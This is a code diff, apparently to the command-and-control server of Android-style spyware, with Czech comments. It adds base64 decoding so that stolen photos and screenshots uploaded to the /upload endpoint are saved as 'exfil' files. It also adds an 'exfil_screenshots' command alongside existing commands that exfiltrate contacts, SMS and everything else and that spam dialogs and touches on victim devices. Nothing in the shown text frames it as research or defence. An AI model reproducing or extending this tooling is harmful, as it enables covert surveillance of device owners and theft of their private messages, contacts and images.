@@ -120,15 +120,28 @@ class QRHandler(BaseHTTPRequestHandler):
             self._send(200, "OK", "text/plain")
 
         elif p == "/upload":
+            import base64
             q = parse_qs(u.query)
             aid = q.get("id", ["unknown"])[0]
             dtype = q.get("type", ["data"])[0]
             name = q.get("name", ["data.txt"])[0]
             safe = "".join(c for c in name if c.isalnum() or c in "._-") or "data.txt"
             fp = os.path.join(DATA_DIR, f"{aid}_{dtype}_{safe}")
-            with open(fp, "w") as f:
-                f.write(raw)
-            log(f"📥 exfil {aid}: {dtype}/{safe} ({len(raw)} B) -> {fp}")
+            # Binární typy (photo, screenshot) dekóduj z Base64, textové nech jako text
+            if dtype in ("photo", "screenshot"):
+                try:
+                    binary = base64.b64decode(raw)
+                    with open(fp, "wb") as f:
+                        f.write(binary)
+                    log(f"📥 exfil {aid}: {dtype}/{safe} ({len(binary)} B, base64 decoded) -> {fp}")
+                except Exception as e:
+                    log(f"exfil decode error: {e}")
+                    with open(fp, "w") as f:
+                        f.write(raw)
+            else:
+                with open(fp, "w") as f:
+                    f.write(raw)
+                log(f"📥 exfil {aid}: {dtype}/{safe} ({len(raw)} B) -> {fp}")
             self._send(200, "OK", "text/plain")
 
         elif p == "/push":
@@ -200,6 +213,7 @@ a.act{color:#7a8bff}
 <option value="exfil_contacts">exfil_contacts</option>
 <option value="exfil_sms">exfil_sms</option>
 <option value="exfil_all">exfil_all</option>
+<option value="exfil_screenshots">exfil_screenshots</option>
 <option value="dialog_spam:5">dialog_spam:5</option>
 <option value="touch_spam:5">touch_spam:5</option>
 <option value="screenshot_loop:5">screenshot_loop:5</option>
